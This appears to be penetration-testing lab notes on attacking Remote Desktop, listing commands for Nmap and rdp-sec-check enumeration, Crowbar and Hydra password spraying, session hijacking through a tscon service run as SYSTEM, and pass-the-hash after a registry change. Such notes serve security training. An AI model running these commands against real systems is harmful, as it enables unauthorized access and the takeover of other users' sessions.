1. Nmap: `nmap -sV -sC 10.129.201.248 -p3389 --script rdp*`
2. [rdp-sec-check](https://github.com/CiscoCXSecurity/rdp-sec-check)
    1. `git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check`
    2. `./rdp-sec-check.pl 10.129.201.24` 
3. Initiate an RDP Session
    1. `xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248`
    2. `xfreerdp /u:username /p:password /v:10.129.75.180 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution /drive:linux,/`
4. Crowbar - RDP Password Spraying: `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`
5. Hydra - RDP Password Spraying: `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`
#### **RDP Session Hijacking**
1. To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID (4 for the lewen session in our example) we would like to connect to which session name (rdp-tcp#13, which is our current session): `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`
2. Escale privileges from local administrator to SYSTEM;
    1. `query user`
    2. `sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"`
    3. `net start sessionhijack`
### **RDP Pass-the-Hash (PtH)**
1. Adding the DisableRestrictedAdmin Registry Key: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
2. Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access: `xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9`
